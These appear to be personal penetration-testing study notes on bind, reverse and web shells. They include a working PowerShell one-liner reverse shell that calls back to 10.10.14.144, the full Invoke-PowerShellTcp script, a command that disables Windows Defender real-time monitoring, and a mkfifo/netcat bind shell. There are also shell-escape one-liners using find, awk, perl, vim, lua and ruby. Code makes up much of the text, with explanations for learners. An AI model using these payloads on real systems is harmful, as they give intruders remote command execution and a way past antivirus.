                   

    A shell is a program that provides a computer user with an interface to input instructions into 
    the system and view text output (Bash, Zsh, cmd, and PowerShell, for example).As penetration 
    testers and information security professionals, a shell is often the result of exploiting a 
    vulnerability or bypassing security measures to gain interactive access to a host.


    the shell gives us direct access to the OS, system commands, and file system. So if we gain 
    access, we can start enumerating the system for vectors that may allow us to escalate privileges,
    pivot, transfer files, and more.It's important to note that establishing a shell almost always 
    means we are accessing the CLI of the OS


        --Bind Shells


    With a bind shell, the target system has a listener started and awaits a connection from a 
    pentester's system (attack box).

                   
                   
                   
                   
                   
                   
                   
                   
                        --------Powershell-------

        !-UAC and execution policy can be inforced in powershell but not on cmd.exe

        !-powershel keeps records of executed commands while cmd doesnt

        !- Powershell come out in win7 





        possible shells:
        - laundanum
        -antak webshell



            -Disable AV

        PS > Set-MpPreference -DisableRealtimeMonitoring $true



    In PowerShell 5.1 and above, you can find out what edition you are running with the $PSEdition 
    automatic variable:

    $PSEdition

      
      
        ----simple reverse shell in windows


        This time around with our listener, we are binding it to a common port (443), 
        this port usually is for HTTPS connections. We may want to use common ports like this 
        because when we initiate the connection to our listener, we want to ensure it does not 
        get blocked going outbound through the OS firewall and at the network level. 
    
    $ sudo nc -lvnp 443

    -Client (target)

    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.144',443);
    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
    $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,
    0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path 
    + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,
    $sendbyte.Length);$stream.Flush()};$client.Close()"

    !!!!this payload will triger windows defender and it wont work

    

    - powershell -nop -c 

    Executes powershell.exe with no profile (nop) and executes the command/script block (-c) 
    contained in the quotes. This particular command is issued inside of command-prompt, which is 
    why PowerShell is at the beginning of the command.


    - "$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,433);"

    Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance 
    of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect 
    with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the 
    commands & code are executed sequentially.


    -  $stream = $client.GetStream();

    Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework 
    method called GetStream that facilitates network communications.


    -  [byte[]]$bytes = 0..65535|%{0}; 

    Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array.
    This is essentially an empty byte stream that will be directed to the TCP listener on an 
    attack box awaiting a connection.


    -  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)


    Starts a while loop containing the $i variable set equal to (=) the .NET framework 
    Stream.Read ($stream.Read) method. The parameters: buffer ($bytes), offset (0), and 
    count ($bytes.Length) are defined inside the parentheses of the method.


    -  {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);

    Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that will 
    be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. 
    In short, what we type wont just be transmitted and received as empty bits but will be encoded 
    as ASCII text. 


    -   $sendback = (iex $data 2>&1 | Out-String ); 


    Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against 
    the $data variable, then redirects the standard error (2>) & standard output (1) through a pipe 
    (|) to the Out-String cmdlet which converts input objects into strings. 
    Because Invoke-Expression is used, everything stored in $data will be run on the local computer. 



    -   $sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 

    Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string 
    PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. 
    This will result in the shell prompt being PS C:\workingdirectoryofmachine >. 


    -  $sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};

    Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a 
    TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.


    -   $client.Close()


    This is the TcpClient.Close method that will be used when the connection is terminated.






function Invoke-PowerShellTcp 
{ 
     
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}





                        -------Linux--------

            ----whitewinterwolf`s php webshell
    https://github.com/WhiteWinterWolf/wwwolf-php-webshell

    

    -----bind shell

    -using nc

            from the target machine

            $nc -lnvp {port}

            from the attack box

            $nc -nv {target} {port}

            !Know that this is not a proper shell. It is just a Netcat TCP session we have 
            established.

    -Establishing a Basic Bind Shell with Netcat

    On the server-side, we will need to specify the directory, shell, listener, work with some 
    pipelines, and input & output redirection to ensure a shell to the system gets served when 
    the client attempts to connect.

    -from the target machine: (bind the tcp shell to localhost)
    $ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f


    - $ rm -f /tmp/f ; 
    Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. 
    The semi-colon (;) is used to execute the command sequentially.

    - $ mkfifo /tmp/f;
    Makes a FIFO named pipe file at the location specified. In this case, 
    /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command 
    sequentially.

    - $ cat /tmp/f | 

    Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of 
    cat /tmp/f to the standard input of the command that comes after the pipe (|).

    - $ /bin/bash -i 2>&1 | 

    Specifies the command language interpreter using the -i option to ensure the shell is interactive.
    2>&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected 
    to the command following the pipe (|).

    - $ nc 10.10.14.12 7777 > /tmp/f  

    Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. 
    The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat 
    listener when the reverse shell one-liner command is executed






    -from the atack box
    $ nc -nv {ip} {port}


    !!!tip command

    find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

    find . -exec /bin/sh \; -quit

    This use of the find command uses the execute option (-exec) to initiate the shell interpreter 
    directly. If find cant find the specified file, then no shell will be attained.



    - perl shell

    perl â€”e 'exec "/bin/sh";'

    -Ruby To Shell

    ruby: exec "/bin/sh"

    -Lua To Shell

    lua: os.execute('/bin/sh')

    -AWK To Shell

    awk 'BEGIN {system("/bin/sh")}'

    -Using Find For A Shell

    find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;


    -Vim To Shell

    vim -c ':!/bin/sh'







                        ////web shells

    

    A web shell is a browser-based shell session we can use to interact with the underlying operating 
    system of a web server. Again, to gain remote code execution via web shell, we must first find a 
    website or web application vulnerability that can give us file upload capabilities. Most web 
    shells are gained by uploading a payload written in a web language on the target server.


    ---ASPX Explained

    Active Server Page Extended (ASPX) is a file type/extension written for Microsofts ASP.NET 
    Framework. On a web server running the ASP.NET framework, web form pages can be generated for 
    users to input data. On the server side, the information will be converted into HTML. We can take
    advantage of this by using an ASPX-based web shell to control the underlying Windows operating 
    system. 


    
